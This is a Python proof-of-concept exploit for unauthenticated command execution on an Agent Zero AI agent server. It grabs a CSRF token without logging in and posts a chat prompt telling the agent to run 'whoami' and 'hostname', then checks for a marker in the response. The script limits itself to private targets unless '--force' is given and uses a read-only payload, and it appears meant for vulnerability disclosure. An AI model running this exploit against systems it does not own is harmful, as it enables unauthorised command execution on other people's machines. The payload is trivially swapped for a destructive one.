#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
poc_cmd_exec.py -- Agent Zero unauthenticated command execution (CVE pending)

Sends a chat request to an Agent Zero instance and asks the agent to run a
read-only command. No credentials and no session cookies are used.

Usage:
    python poc_cmd_exec.py --target http://127.0.0.1:5000
    python poc_cmd_exec.py --target http://10.0.0.5:5000

Safety:
    * The script refuses non-loopback / non-private targets unless --force.
    * The payload only echoes a marker, the current user and the hostname.
    * Run it only against an instance you own or are authorised to test.

Requirements:
    pip install requests
    A configured LLM backend on the target (the agent must be able to call tools).
"""
import argparse
import ipaddress
import sys
import uuid
from urllib.parse import urlparse

import requests

MARKER = "A0-POC-7F3C"
DEFAULT_TARGET = "http://127.0.0.1:5000"


def is_local_or_private(host: str) -> bool:
    if host in ("localhost", "127.0.0.1", "::1"):
        return True
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    return ip.is_loopback or ip.is_private


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Agent Zero unauthenticated command execution PoC (read-only payload)"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help="base URL of the Agent Zero UI")
    parser.add_argument("--timeout", type=int, default=180, help="seconds to wait for the agent")
    parser.add_argument("--http-timeout", type=int, default=20, help="seconds for HTTP calls")
    parser.add_argument("--force", action="store_true", help="allow non-private targets")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    host = urlparse(target).hostname or ""
    if not is_local_or_private(host) and not args.force:
        print("[!] Refusing non-local target %r; pass --force only if you own it." % host)
        return 2

    session = requests.Session()
    session.trust_env = False  # bypass system proxies for loopback tests

    try:
        health = session.get(target + "/api/health", timeout=5)
        print("[*] GET /api/health -> %s" % health.status_code)
    except Exception as exc:
        print("[!] target not reachable: %s: %s" % (type(exc).__name__, exc))
        return 2

    try:
        token_resp = session.get(
            target + "/api/csrf_token",
            headers={"Origin": target},
            timeout=args.http_timeout,
        )
        print("[*] GET /api/csrf_token -> %s" % token_resp.status_code)
        token_resp.raise_for_status()
        token = token_resp.json()["token"]
    except Exception as exc:
        print("[!] could not obtain a CSRF token: %s: %s" % (type(exc).__name__, exc))
        return 2

    command = "echo %s && whoami && hostname" % MARKER
    prompt = "Please run this read-only command and show me the full raw output: " + command
    print("[*] payload: %s" % command)

    try:
        resp = session.post(
            target + "/api/message",
            json={"text": prompt, "context": "poc-" + uuid.uuid4().hex[:8]},
            headers={
                "Origin": target,
                "X-CSRF-Token": token,
                "Content-Type": "application/json",
            },
            timeout=args.timeout,
        )
    except Exception as exc:
        print("[!] request failed: %s: %s" % (type(exc).__name__, exc))
        print("[i] The agent needs a working LLM backend to invoke the tool.")
        return 2

    print("[*] POST /api/message -> %s" % resp.status_code)
    body = resp.text or ""
    print("---- response (truncated) ----")
    print(body[:2000])
    print("------------------------------")

    if resp.status_code == 200 and MARKER in body:
        print("[+] VULNERABLE: marker observed in the HTTP response")
        return 0

    print("[-] marker not observed (LLM backend unavailable, or the agent refused the tool call)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
